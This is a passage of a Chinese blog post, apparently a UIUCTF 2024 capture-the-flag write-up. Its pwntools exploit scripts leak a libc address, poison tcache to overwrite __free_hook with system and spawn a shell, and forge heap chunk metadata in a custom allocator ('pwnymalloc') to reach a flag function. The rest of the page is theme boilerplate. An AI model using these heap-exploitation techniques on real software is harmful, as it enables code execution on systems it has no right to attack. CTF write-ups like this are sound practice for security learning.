sla(b&#x27;&gt;&#x27;,str(3))<br>    sla(b&#x27;&gt;&#x27;,str(a))<br>    sla(b&#x27;&gt;&#x27;,str(idx))<br>def edit(a,idx,text):<br>    sla(b&#x27;&gt;&#x27;,str(4))<br>    sla(b&#x27;&gt;&#x27;,str(a))<br>    sla(b&#x27;&gt;&#x27;,str(idx))<br>    sla(b&#x27;&gt;&#x27;,text)<br>def magic():<br>    sla(b&#x27;&gt;&#x27;,str(5))<br><br>magic()<br>pw.recv(1)<br>libc_base = int(pw.recv(14),16) - 0x1ecbe0<br>lss(&#x27;libc_base&#x27;)<br><br>add(2)<br>add(2)<br>add(2)<br>add(2)<br><br>free(2,0)<br>free(2,1)<br>add(1)<br>edit(1,0,p64(libc_base+libc.sym[&#x27;__free_hook&#x27;]))<br><br>add(2)<br>add(2)<br>edit(2,2,b&#x27;/bin/sh\x00&#x27;)<br>edit(2,3,p64(libc_base+libc.sym[&#x27;system&#x27;]))<br><br><br>pwpw()<br></code></pre></td></tr></table></figure>
+
+<h2 id="pwnymalloc"><a href="#pwnymalloc" class="headerlink" title="pwnymalloc"></a>pwnymalloc</h2><img src="/2024/07/01/uiuctf/3.png" srcset="/img/loading.gif" lazyload class="">
+
+<img src="/2024/07/01/uiuctf/4.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>​	有个类似unlink堆块合并的操作，前提是能进入if内，也就是保证pre_size的堆块有size，以及size的最后半个字节是1，可以通过写入堆块的操作覆盖pre_size，然后伪造一下合并的区域就可以申请到前面堆块了，往堆块写入1，就可以get_flag了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs undefined">from pwn import *<br>from struct import *<br>from ctypes import *<br>from LibcSearcher import *<br>from functools import reduce<br>from z3 import *<br>import gmpy2<br>#import ctf_pb2<br><br>c = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br># srop :    frame = SigreturnFrame()<br># fmt :        fmtstr_payload(offset=7,writes=&#123;0x4031E0:0x0401445,0x403410:0x401445&#125;,numbwritten=((14*2)+1),write_size=&#x27;short&#x27;)<br><br>s    =    lambda a              :pw.send(a)<br>sl   =    lambda a              :pw.sendline(a)<br>sa   =    lambda a,b            :pw.sendafter(a,b)<br>sla  =    lambda a,b            :pw.sendlineafter(a,b)<br>r    =    lambda a=6666         :pw.recv(a)<br>rl   =    lambda                :pw.recvline()<br>ru   =    lambda a,b=True       :pw.recvuntil(a,b)<br>g64  =    lambda                :u64(pw.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>g32  =    lambda                :u32(pw.recvuntil(b&#x27;\xf7&#x27;).ljust(4,b&#x27;\x00&#x27;))<br>gl   =    lambda a              :u64(pw.recvuntil(a,drop=True).ljust(8,b&#x27;\x00&#x27;))<br>gc   =    lambda a              :u64(pw.recv(7).rjust(8,b&#x27;\x00&#x27;))<br>pwpw =    lambda                :pw.interactive()<br>lss  =    lambda s :log.success(&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27; % (s, eval(s)))<br>cal  =    lambda a,b            :((a - b) + 0x10000) % 0x10000<br><br>def sb(libc_base):<br>    return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))<br><br>def orw(libc_base):<br>    return libc_base + libc.sym[&#x27;open&#x27;], libc_base + libc.sym[&#x27;read&#x27;], libc_base + libc.sym[&#x27;write&#x27;]<br><br>def search():<br>    libc = LibcSearcher(&quot;puts&quot;, puts)<br>    libc_base = puts - libc.dump(&quot;puts&quot;)<br>    system = libc.dump(&quot;system&quot;) + libc_base<br>    binsh = libc.dump(&quot;str_bin_sh&quot;) + libc_base<br>    return system,binsh<br><br>def dbg(a=&#x27;&#x27;):<br>    if a !=&#x27;&#x27;:<br>        gdb.attach(pw,a) <br>        pause()<br>    else:<br>        gdb.attach(pw)  <br>        pause()<br>  <br># context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)<br># context.arch=&#x27;i386&#x27;<br>context.terminal=[&quot;tmux&quot; ,&quot;split&quot; ,&quot;-h&quot;]<br>context.arch = &#x27;amd64&#x27;<br>file = &#x27;./chal&#x27;<br>elf = ELF(file)<br>#libc = ELF(&#x27;/home/pw/pwn_tools/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6&#x27;)  <br># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) x<br>debug = 0<br>if debug == 0:<br>    pw = process(file)<br>if debug == 1:<br>    pw = remote(&quot;pwn-5519381bfe.challenge.xctf.org.cn&quot;, 9999, ssl=True)<br>if debug == 2:<br>    gdbscript = &#x27;&#x27;&#x27;<br>        set debug-file-directory /home/pwn_tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/.debug/<br>        continue<br>    &#x27;&#x27;&#x27;<br>    pw = gdb.debug(file, gdbscript=gdbscript)<br><br>#----------------------------------------------------------------------<br>def re(data,text):<br>    sla(b&#x27;&gt; &#x27;,str(3))<br>    sla(&#x27;refunded:\n&#x27;,str(data))<br>    sa(b&#x27;request:\n&#x27;,text)<br><br>def su(a):<br>    sla(b&#x27;&gt;&#x27;,str(1))<br>    sla(b&#x27;:\n&#x27;,a)<br><br><br>def getflag(idx):<br>    ru(&#x27;&gt; &#x27;)<br>    sl(&#x27;4&#x27;)<br>    ru(&#x27;:\n&#x27;)<br>    sl(str(idx))<br><br><br>pay = fit(&#123;<br>    0x60: 0x40,<br>    0x78: 0,<br>    &#125;,filler=b&#x27;\x00&#x27;)[:-1]<br><br>re(&#x27;8&#x27;,pay)<br><br><br>pay = fit(&#123;<br>    0x78: 0xb0,<br>    &#125;,filler=b&#x27;\x00&#x27;)[:-1]<br><br>re(&#x27;-1&#x27;,pay)<br><br>su(&#x27;1&#x27;)<br>pay = p64(1) * 6 + b&#x27;\n&#x27;<br>re(&#x27;1&#x27;,pay)<br><br><br>getflag(1)<br># dbg()<br>pwpw()<br></code></pre></td></tr></table></figure>
+
+<h2 id="Syscalls2"><a href="#Syscalls2" class="headerlink" title="Syscalls2"></a>Syscalls2</h2><p>?你还真以为我会内核哇，必不可能会的，兄弟</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2024uiuctf</div>
+      <div>http://example.com/2024/07/01/uiuctf/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>pw</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年7月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/01/fuzzing101-01/" title="fuzzing101-01">
+                        <span class="hidden-mobile">fuzzing101-01</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"y2JhJN2Q6Bvhk7i3zBmRYZkn-gzGzoHsz","appKey":"NSFQG1YUdY6huW8XwmlgXGLG","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
